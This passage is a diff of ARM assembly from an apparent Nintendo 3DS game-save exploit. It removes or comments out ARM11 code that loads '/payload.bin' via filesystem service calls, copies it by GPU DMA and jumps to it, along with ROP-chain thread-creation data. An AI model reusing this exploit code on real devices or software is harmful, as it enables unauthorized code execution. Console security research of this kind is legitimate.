-bl throw_fatalerr_check
-
-add r0, sp, #20 @ filehandle*
-add r1, sp, #0 @ u32* outsize
-bl fsfile_getsize
-bl throw_fatalerr_check
-
-ldr r6, [sp, #0]
-
-add r0, sp, #24
-str r0, [sp, #0] @ u32* total transfersize
-add r0, sp, #20 @ filehandle*
-mov r1, #0 @ u32 filepos
-ldr r2, =0x14700000 @ buf*
-mov r3, r6 @ size
-bl fsfile_read
-bl throw_fatalerr_check
-
-add r0, sp, #20 @ filehandle*
-bl fsfile_close
-
-ldr r0, [sp, #20]
-blx arm11code_svcCloseHandle
-
-ldr r0, [sp, #16]
-blx arm11code_svcCloseHandle
-
-mov r0, #7
-add r6, r6, r0
-bic r6, r6, r0 @ 8-byte alignment
-
-ldr r2, =GSP_CMD8//flushdcache
-ldr r0, =0x14700000
-mov r1, r6
-blx r2
-
-mov r0, #0
-str r0, [sp, #0] @ height0
-str r0, [sp, #4] @ width1
-str r0, [sp, #8] @ height1
-mov r0, #8
-str r0, [sp, #12] @ flags
-ldr r0, =0x14700000 @ GPU DMA src addr
-
-ldr r1, =(gxcpy_dstaddr-_start) + SAVEADR
-ldr r1, [r1]
-mov r7, r1
-ldr r2, =0x1000
-add r1, r1, r2
-
-mov r2, r6 @ size
-mov r3, #0 @ width0
-ldr r4, =GXLOWCMD_4
-blx r4
-
-ldr r0, =1000000000
-mov r1, #0
-blx arm11code_svcSleepThread
-
-ldr r5, =0x14701000
-mov r0, r5
-mov r3, r0
-mov r1, #0
-ldr r2, =0x1000
-
-arm11code_memclr:
-str r1, [r3]
-add r3, r3, #4
-sub r2, r2, #4
-bgt arm11code_memclr
-
-ldr r1, =THROWFATALERR
-str r1, [r0, #4]
-ldr r1, =GXLOWCMD_4
-str r1, [r0, #0x1c]
-ldr r1, =GSP_CMD8
-str r1, [r0, #0x20]
-mov r1, #0x8d @ flags
-str r1, [r0, #0x48]
-ldr r1, =GSPGPU_HANDLEADR
-str r1, [r0, #0x58]
-ldr r1, =0x08010000
-str r1, [r0, #0x64]
-
-arm11code_callpayload:
-mov r0, r5
-ldr r1, =(0x10000000-4)
-ldr r2, =0x00101000
-blx r2
-
-arm11code_end:
-b arm11code_end
-.pool
-
-throw_fatalerr_check:
-cmp r0, #0
-bne throw_fatalerr
-bx lr
-
-throw_fatalerr:
-ldr r1, =THROWFATALERR
-bx r1
-.pool
-
-fsuser_initialize:
-push {r0, r1, r2, r3, r4, r5, lr}
-blx arm11code_getcmdbuf
-mov r4, r0
-
-ldr r0, [sp, #0]
-
-ldr r5, =0x08010002
-str r5, [r4, #0]
-mov r1, #0x20
-str r1, [r4, #4]
-ldr r0, [r0]
-blx arm11code_svcSendSyncRequest
-cmp r0, #0
-bne fsuser_initialize_end
-ldr r0, [r4, #4]
-
-fsuser_initialize_end:
-add sp, sp, #16
-pop {r4, r5, pc}
-
-fsuser_openfiledirectly: @ r0=fsuser* handle, r1=archiveid, r2=lowpath bufptr*(utf16), r3=lowpath bufsize, sp0=openflags, sp4=file out handle*
-push {r0, r1, r2, r3, r4, r5, lr}
-blx arm11code_getcmdbuf
-mov r4, r0
-
-ldr r0, [sp, #0]
-ldr r1, [sp, #4]
-ldr r2, [sp, #8]
-ldr r3, [sp, #12]
-
-ldr r5, =0x08030204
-str r5, [r4, #0]
-mov r5, #0
-str r5, [r4, #4] @ transaction
-str r1, [r4, #8] @ archiveid
-mov r5, #1
-str r5, [r4, #12] @ Archive LowPath.Type
-str r5, [r4, #16] @ Archive LowPath.Size
-mov r5, #4
-str r5, [r4, #20] @ Archive LowPath.Type
-str r3, [r4, #24] @ Archive LowPath.Size
-ldr r5, [sp, #28]
-str r5, [r4, #28] @ Openflags
-mov r5, #0
-str r5, [r4, #32] @ Attributes
-ldr r5, =0x4802
-str r5, [r4, #36] @ archive lowpath translate hdr/ptr
-mov r5, sp
-str r5, [r4, #40]
-mov r5, #2
-lsl r3, r3, #14
-orr r3, r3, r5
-str r3, [r4, #44] @ file lowpath translate hdr/ptr
-str r2, [r4, #48]
-
-ldr r0, [r0]
-blx arm11code_svcSendSyncRequest
-cmp r0, #0
-bne fsuser_openfiledirectly_end
-
-ldr r0, [r4, #4]
-ldr r2, [sp, #32]
-ldr r1, [r4, #12]
-cmp r0, #0
-bne fsuser_openfiledirectly_end
-str r1, [r2]
-
-fsuser_openfiledirectly_end:
-add sp, sp, #16
-pop {r4, r5, pc}
-.pool
-
-fsfile_read: @ r0=filehandle*, r1=u32 filepos, r2=buf*, r3=size, sp0=u32* total transfersize
-push {r0, r1, r2, r3, r4, r5, lr}
-blx arm11code_getcmdbuf
-mov r4, r0
-
-ldr r0, [sp, #0]
-ldr r1, [sp, #4]
-ldr r2, [sp, #8]
-ldr r3, [sp, #12]
-
-ldr r5, =0x080200C2
-str r5, [r4, #0]
-str r1, [r4, #4] @ filepos
-mov r1, #0
-str r1, [r4, #8]
-str r3, [r4, #12] @ Size
-mov r5, #12
-lsl r3, r3, #4
-orr r3, r3, r5
-str r3, [r4, #16] @ file lowpath translate hdr/ptr
-str r2, [r4, #20]
-
-ldr r0, [r0]
-blx arm11code_svcSendSyncRequest
-cmp r0, #0
-bne fsfile_read_end
-ldr r0, [r4, #4]
-ldr r2, [sp, #28]
-ldr r1, [r4, #8]
-cmp r0, #0
-bne fsfile_read_end
-str r1, [r2]
-
-fsfile_read_end:
-add sp, sp, #16
-pop {r4, r5, pc}
-.pool
-
-fsfile_close: @ r0=filehandle*
-push {r0, r1, r2, r3, r4, r5, lr}
-blx arm11code_getcmdbuf
-mov r4, r0
-
-ldr r0, [sp, #0]
-
-ldr r5, =0x08080000
-str r5, [r4, #0]
-
-ldr r0, [r0]
-blx arm11code_svcSendSyncRequest
-cmp r0, #0
-bne fsfile_close_end
-ldr r0, [r4, #4]
-
-fsfile_close_end:
-add sp, sp, #16
-pop {r4, r5, pc}
-.pool
-
-fsfile_getsize: @ r0=filehandle*, r1=u32* outsize
-push {r0, r1, r2, r3, r4, r5, lr}
-blx arm11code_getcmdbuf
-mov r4, r0
-
-ldr r0, [sp, #0]
-
-ldr r5, =0x08040000
-str r5, [r4, #0]
-
-ldr r0, [r0]
-blx arm11code_svcSendSyncRequest
-cmp r0, #0
-bne fsfile_getsize_end
-ldr r0, [r4, #4]
-cmp r0, #0
-bne fsfile_getsize_end
-
-ldr r1, [r4, #8]
-ldr r2, [sp, #4]
-str r1, [r2]
-
-fsfile_getsize_end:
-add sp, sp, #16
-pop {r4, r5, pc}
-.pool
-
-.arm
-
-armcrashff:
-.word 0xffffffff
-
-.type arm11code_getcmdbuf, %function
-arm11code_getcmdbuf:
-mrc p15, 0, r0, cr13, cr0, 3
-add r0, r0, #0x80
-bx lr
-
-.type arm11code_svcControlMemory, %function
-arm11code_svcControlMemory:
-svc 0x01
-bx lr
-
-.type arm11code_svcSendSyncRequest, %function
-arm11code_svcSendSyncRequest:
-svc 0x32
-bx lr
-
-.type arm11code_svcCloseHandle, %function
-arm11code_svcCloseHandle:
-svc 0x23
-bx lr
-
-.type arm11code_svcSleepThread, %function
-arm11code_svcSleepThread:
-svc 0x0a
-bx lr
-
-arm11code_servname:
-.string "fs:USER"
-.align 2
-
-arm11code_payloadpath:
-.string16 "/payload.bin"
-.align 2
-arm11code_payloadpath_end:
-
-.space (_start + ARM11CODE_OFF + ARM11CODE_SIZE) - . @ ARM11 code section end.
-#endif
-
 #ifdef REPLACE_SRVACCESSCONTROL
 .space (_start + SRVACCESS_OFF) - . @ New service access control
 .ascii "APT:U"
@@ -1443,28 +705,18 @@ arm11code_payloadpath_end:
 .align 2
 #endif
 
-.space (_start + 0x1050) - .
-.word SAVEADR+0x1054
-.word SAVEADR+0x1058
+/*.space (_start + 0x1050) - .
+.word ROPBUF+0x1054
+.word ROPBUF+0x1058
 .word 0, 0, 0, 0
-.word REGPOPR0R3SL
-
-appmemtype_appmemsize_table: @ This is a table for the actual APPLICATION mem-region size, for each APPMEMTYPE.
-.word 0x04000000 @ type0
-.word 0x04000000 @ type1
-.word 0x06000000 @ type2
-.word 0x05000000 @ type3
-.word 0x04800000 @ type4
-.word 0x02000000 @ type5
-.word 0x07C00000 @ type6
-.word 0x0B200000 @ type7
+.word REGPOPR0R3SL*/
 
 #ifdef REPLACE_SRVACCESSCONTROL
 .space (_start + 0x1080) - . @ srv:pm cmd
 .word 0 @ ProcessID
 .word 0x18 @ Service access control size, in words
 .word 0x180002
-.word SAVEADR+SRVACCESS_OFF @ Service access control ptr
+.word ROPBUF+SRVACCESS_OFF @ Service access control ptr
 #endif
 
 #if EXECHAX==0
@@ -1473,7 +725,7 @@ appmemtype_appmemsize_table: @ This is a table for the actual APPLICATION mem-re
 .word 0, 0, 0, 0, 0, 0, 0, 0 @ SHA256 hash
 .word 0
 .word 0x00820002 @ ((Ctx size<<14) | 2), for size 0x208.
-.word SAVEADR+RSAINFO_OFF @ Ctx
+.word ROPBUF+RSAINFO_OFF @ Ctx
 .word (PSPS_SIGBUFSIZE<<4) | 10
 .word 0x08000000 @ Signature
 #endif
@@ -1496,47 +748,30 @@ appmemtype_appmemsize_table: @ This is a table for the actual APPLICATION mem-re
 .space (_start + 0x1200) - . @ cmd data for am:net command 0x00190040 ReloadDBS.
 .word 1 @ Mediatype = SD
 #endif
-
+/*
 .space (_start + 0x1280) - .
 @ The r1, r2, and r3 passed to L_3508b8 from STACKMEMCPYADR are loaded from here, with r4+0x1000+0x280. r2/r3 are unused however. L_3508b8 calls vtable funcptr +4 from the inr1 class.
-.word SAVEADR+0x128c @ r1, ptr to class.
+.word ROPBUF+0x128c @ r1, ptr to class.
 .word 0, 0
 
-.word SAVEADR+0x1290 @ Ptr to class vtable.
+.word ROPBUF+0x1290 @ Ptr to class vtable.
 .word 0 @ The first vtable funcptr is unused by L_3508b8.
-.word REGPOP24ADR @ Pop the data off the stack which was pushed by L_3508b8, and additionally pop the first word of data which was copied to the stack with memcpy32 into PC.
-
+.word POP_R4FPPC @ Pop the data off the stack which was pushed by L_3508b8, and additionally pop the first word of data which was copied to the stack with memcpy32 into PC.
+*/
 .space (_start + 0x13bc) - .
 .word 2012, 10, 22 @ Datetime displayed on the save-file select screen.
 .word 13, 8
 
-#ifdef START_ROPTHREAD
-.space (_start + THREADSTART_ROPCHAINOFF) - . @ Create a thread for running the main ROP. Thread creation is used here since a stack-pivot isn't possible under oot3d with an *absolute* address for sp. Copying more ROP to <current sp> from here isn't an option either, since the ROP-chains(or at least some of them) would be too large for the stack.
-.word REGPOPADR
-.word SAVEADR+0x104c @ r0, thread handle*
-.word REGPOPADR @ r1, func entrypoint
-.word 0 @ r2, thread arg r0
-.word SAVEADR+0x180 @ r3, stacktop
-.word 0x0f @ r4
-.word 0 @ r5
-.word svcCreateThread @ r6
-.word 0 @ fp
-.word 0 @ ip
-.word BLXR6
+/*#ifdef START_ROPTHREAD
+.space (_start + THREADSTART_ROPCHAINOFF) - .
+@ Create a thread for running the main ROP. Thread creation is used here since a stack-pivot isn't possible under oot3d with an *absolute* address for sp. Copying more ROP to <current sp> from here isn't an option either, since the ROP-chains(or at least some of them) would be too large for the stack.
 
-.word 0x2d, ~1 @ d8 / sp0 threadpriority + insp4 processorid mask
-.word 0 @ r4
-.word 0 @ r5
-.word 0 @ r6
-.word 0 @ r7
-.word 0 @ r8
-.word 0 @ r9
-.word 0 @ sl
+CALLFUNC svcCreateThread, ROPBUF+0x104c, ROP_POPPC, 0, (ROPBUF + (ropstackstart - _start)), 0x2d, -1, 0, 0
 
 .word ROP_POPR3_ADDSPR3_POPPC
 
 .word 0xfffffff8 @ Lame infinite-loop, since JPN-region game doesn't have any ARM/thumb branch instructions for infinite loop.
-#endif
+#endif*/
 
 .space (_start + 0x14dc) - .
 
